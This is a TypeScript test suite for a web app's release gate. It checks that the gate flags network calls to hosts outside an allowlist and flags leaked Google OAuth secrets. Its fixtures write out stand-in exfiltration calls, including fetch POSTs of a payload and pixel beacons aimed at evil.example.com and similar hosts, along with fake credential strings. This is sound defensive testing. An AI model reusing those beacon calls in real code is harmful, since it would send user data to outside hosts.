// Phase 20 fix proofs for the release compatibility gate.
//
// Each test reproduces one defect the verifier confirmed by planting input that
// the shipped check accepted. The green suite that shipped with the phase proved
// none of them, because no test planted a call the check could not read.
//
// The origin tests build a fixture into a temp directory and scan the built
// bytes. They never write into the release `dist/`. The gate test assembles a
// small temp `dist/` and runs `scripts/check-browser-compat.ts` against it, so
// the assertion is that the real gate fails, not that one helper returns a
// value. See F1 and F2 in `.agent-work/phase-20/to-fix.md`.

import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  ALLOWED_ORIGINS,
  callArguments,
  disallowedHosts,
  resolveArgument,
  scanNetworkHosts,
  scanSecrets,
  stringBindings
} from '../scripts/compat-scan';

const EVIL = 'https://evil.example.com/collect';
const LITERAL = 'https://literal.example.com/ingest';
const ANCHOR = 'https://anchor.example.com/pixel';
const REMOTE_HOSTS = ['evil.example.com', 'literal.example.com', 'anchor.example.com'];

/** The five call forms the verifier planted. */
const FIXTURE_SOURCE = `
const EVIL = '${EVIL}';
const LITERAL = '${LITERAL}';

export function probeBare(): Promise<Response> {
  return fetch(EVIL);
}

export function probePost(payload: string): Promise<Response> {
  return fetch(EVIL, { method: 'POST', body: payload });
}

export function probeLiteral(): Promise<Response> {
  return fetch(LITERAL);
}

export function probePixel(img: HTMLImageElement, anchor: HTMLAnchorElement): void {
  img.src = EVIL;
  anchor.href = '${ANCHOR}';
}
`;

/** The reviewed CSP policy, copied so the gate test reaches check 11. */
const REVIEWED_CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  "style-src 'self' 'unsafe-inline'",
  "font-src 'self'",
  'img-src \'self\' data:',
  'connect-src https://www.googleapis.com https://oauth2.googleapis.com',
  'form-action https://oauth2.googleapis.com',
  'frame-src https://accounts.google.com',
  "base-uri 'self'",
  "object-src 'none'"
].join('; ');

describe('origin scan reads every planted call form', () => {
  let workDir = '';
  let builtBundle = '';

  beforeAll(async () => {
    workDir = await mkdtemp(join(tmpdir(), 'repjot-compat-'));
    const sourcePath = join(workDir, 'fixture.ts');
    await writeFile(sourcePath, FIXTURE_SOURCE, 'utf8');

    const result = await Bun.build({
      entrypoints: [sourcePath],
      outdir: join(workDir, 'out'),
      minify: true,
      target: 'browser',
      format: 'esm'
    });
    expect(result.success).toBe(true);

    builtBundle = await Bun.file(result.outputs[0]!.path).text();
  });

  afterAll(async () => {
    if (workDir !== '') {
      await rm(workDir, { recursive: true, force: true });
    }
  });

  test('the readable source reports all three remote hosts', () => {
    expect(disallowedHosts(FIXTURE_SOURCE).sort()).toEqual([...REMOTE_HOSTS].sort());
  });

  test('the minified bundle reports all three remote hosts', () => {
    expect(disallowedHosts(builtBundle).sort()).toEqual([...REMOTE_HOSTS].sort());
  });

  test('a call with a second argument still resolves its host', () => {
    const bindings = stringBindings(FIXTURE_SOURCE);
    const postArg = callArguments(FIXTURE_SOURCE).find((arg) => arg.includes('method'));
    expect(postArg).toBeDefined();
    expect(resolveArgument(postArg!, bindings)).toBe(EVIL);
  });

  test('a src assignment resolves through the bound name', () => {
    const hits = scanNetworkHosts(`img.src = EVIL;${FIXTURE_SOURCE}`).map((hit) => hit.host);
    expect(hits).toContain('evil.example.com');
  });

  test('an href assignment resolves a literal URL', () => {
    const hits = scanNetworkHosts(`a.href = '${ANCHOR}';`).map((hit) => hit.host);
    expect(hits).toContain('anchor.example.com');
  });

  test('a minified var binding carries the host into a later call', () => {
    const minified = `var X="${EVIL}";function f(b){return fetch(X,{method:"POST",body:b})}`;
    expect(disallowedHosts(minified)).toContain('evil.example.com');
  });

  test('allowed hosts pass both passes', () => {
    for (const origin of ALLOWED_ORIGINS) {
      const text = `const API = "https://${origin}/v3";fetch(API, { method: 'GET' });`;
      expect(disallowedHosts(text)).toEqual([]);
    }
  });
});

describe('the gate fails on planted remote calls and a planted secret', () => {
  let workDir = '';

  /** Run the real gate against a temp dist and a temp src, so the run is hermetic. */
  async function runGate(distDir: string): Promise<{ code: number; output: string }> {
    const srcDir = join(workDir, 'empty-src');
    await mkdir(srcDir, { recursive: true });
    const proc = Bun.spawnSync(['bun', 'scripts/check-browser-compat.ts'], {
      cwd: join(import.meta.dir, '..'),
      env: {
        ...process.env,
        COMPAT_DIST_DIR: distDir,
        COMPAT_SRC_DIR: srcDir
      }
    });
    return { code: proc.exitCode ?? -1, output: `${proc.stdout.toString()}${proc.stderr.toString()}` };
  }

  /** Write a dist that passes every check except the one under test. */
  async function makeDist(name: string, appJs: string): Promise<string> {
    const distDir = join(workDir, name, 'dist');
    await mkdir(distDir, { recursive: true });
    await writeFile(join(distDir, 'app.js'), appJs, 'utf8');
    await writeFile(join(distDir, 'CNAME'), 'repjot.com\n', 'utf8');
    await writeFile(
      join(distDir, 'index.html'),
      '<!doctype html><html lang="en"><head><meta charset="UTF-8" />' +
        `<meta http-equiv="Content-Security-Policy" content="${REVIEWED_CSP}" />` +
        '<title>REP JOT</title></head><body><div id="app"></div>' +
        '<script>window.__repjotLoadApp = function (s) { var x = 1; };</script>' +
        '<script>window.__repjotLoadApp("./app.js?v=test");</script>' +
        '</body></html>',
      'utf8'
    );
    return distDir;
  }

  beforeAll(async () => {
    workDir = await mkdtemp(join(tmpdir(), 'repjot-gate-'));
  });

  afterAll(async () => {
    if (workDir !== '') {
      await rm(workDir, { recursive: true, force: true });
    }
  });

  test('the gate fails and names all three planted hosts', async () => {
    const appJs =
      'var DRIVE_SCOPE="https://www.googleapis.com/auth/drive.appdata";' +
      `var hD="${EVIL}";var lD="${LITERAL}";` +
      'function probePost(b){return fetch(hD,{method:"POST",body:b})}' +
      'function probeLit(){return fetch(lD)}' +
      'function probePixel(i,a){i.src=hD;a.href="https://anchor.example.com/p"}' +
      'window.__probe=probePost&&probeLit&&probePixel&&DRIVE_SCOPE;';
    const distDir = await makeDist('evil', appJs);

    const result = await runGate(distDir);
    expect(result.code).not.toBe(0);
    expect(result.output).toContain('7. A network call targets a host outside the allowlist');
    for (const host of REMOTE_HOSTS) {
      expect(result.output).toContain(host);
    }
  });

  test('the gate fails and names a planted Google OAuth client secret', async () => {
    const appJs = 'var DRIVE_SCOPE="https://www.googleapis.com/auth/drive.appdata";window.__x=DRIVE_SCOPE;';
    const distDir = await makeDist('secret', appJs);
    await writeFile(
      join(distDir, '__probe_secret.txt'),
      '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\n',
      'utf8'
    );

    const result = await runGate(distDir);
    expect(result.code).not.toBe(0);
    expect(result.output).toContain('6. dist/ may hold a credential');
    expect(result.output).toContain('Google OAuth client secret');
  });

  test('a clean temp dist passes the gate', async () => {
    const appJs =
      'var DRIVE_SCOPE="https://www.googleapis.com/auth/drive.appdata";' +
      'var API="https://www.googleapis.com/drive/v3";' +
      'function load(){return fetch(API,{method:"GET"})}' +
      'window.__x=load&&DRIVE_SCOPE;';
    const distDir = await makeDist('clean', appJs);

    const result = await runGate(distDir);
    expect(result.output).toContain('All 11 compatibility and release checks passed.');
    expect(result.code).toBe(0);
  });
});

describe('secret scan names the shipped Google OAuth client secret', () => {
  test('a planted GOCSPX value fails and names the pattern', () => {
    const planted = 'client id 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 shipped by mistake';
    const names = scanSecrets(planted).map((hit) => hit.name);
    expect(names).toContain('Google OAuth client secret');
  });

  test('a bare placeholder client id does not trip the pattern', () => {
    expect(scanSecrets('const id = "REPLACE_WITH_CLIENT_ID.apps.googleusercontent.com"')).toEqual([]);
  });

  test('the other credential shapes still match', () => {
    const planted = 'client_secret = "abc" + ya29.a0AfH6SMBabcdefghijklmnopqrst';
    const names = scanSecrets(planted).map((hit) => hit.name);
    expect(names).toContain('OAuth client secret');
    expect(names).toContain('Google access token');
  });
});
